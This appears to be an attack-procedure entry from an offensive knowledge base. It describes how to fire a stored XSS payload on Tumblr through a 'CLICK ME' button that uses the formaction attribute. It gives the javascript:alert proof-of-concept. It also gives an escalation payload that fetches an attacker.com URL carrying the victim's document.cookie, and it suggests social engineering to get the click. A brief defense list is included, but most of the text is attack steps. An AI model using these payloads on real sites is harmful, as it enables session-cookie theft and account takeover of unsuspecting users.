---
tags:
  - xss
  - javascript-execution
  - tumblr
type: procedure
tools: []
tactics:
  - '[[Execution]]'
commands: []
platforms:
  - Web
techniques:
  - '[[JavaScript]]'
skill_level: intermediate
impact_level: high
detection_risk: high
sub_techniques: []
id: 1671fd2d-0752-45a9-8bce-3b6d38f0412e
created_at: '2025-12-14T03:46:26.706Z'
updated_at: '2025-12-14T03:46:26.706Z'
verified: false
validated: true
submitted: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[JavaScript]]'
---
# Execute-XSS-Payload-via-Click

## Summary

This procedure covers the final trigger where the victim clicks the rendered 'CLICK ME' button, executing the JavaScript payload and demonstrating or enabling further compromise.

## Description

Clicking the submit button invokes the `javascript:alert(document.domain)` URI, running JS in the victim's browser context. This proves XSS and can be escalated to steal cookies, send requests, or manipulate the DOM. The execution occurs in an authenticated session, amplifying risks like account takeover.

## Requirements

1. Payload rendered in edit mode
2. Victim interacts with the button (social engineering to encourage curiosity)
3. Browser supports formaction attribute

## Defense

Defensive measures and detection strategies:

- Strip or escape javascript: URIs in HTML attributes
- Implement client-side validation for form actions
- Monitor for unexpected JS execution in user sessions via logging

## Objectives

1. Execute arbitrary JavaScript
2. Access victim session data
3. Enable follow-on attacks like data exfil

## Instructions

### Step 1: Victim Interacts with Button

**Context**: Prompt the click through UI curiosity.

In edit mode, the button is visible; victim clicks 'CLICK ME'.

### Step 2: Payload Activates

**Context**: Form submission triggers JS.

The formaction executes: `javascript:alert(document.domain)`, popping an alert.

### Step 3: Escalate if Successful

**Context**: Replace alert for real exploitation.

Modify payload to: `formaction=javascript:fetch('https://attacker.com/steal?cookie='+document.cookie)`, exfiltrating data.

> Alert confirms domain (e.g., tumblr.com); no network in PoC.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]]

### Techniques

- [[JavaScript]]

### Sub-Techniques

- None

## Commands Used

- None

## Tools Used

- None

## Tags

- [[xss]]
- [[javascript-execution]]
- [[tumblr]]
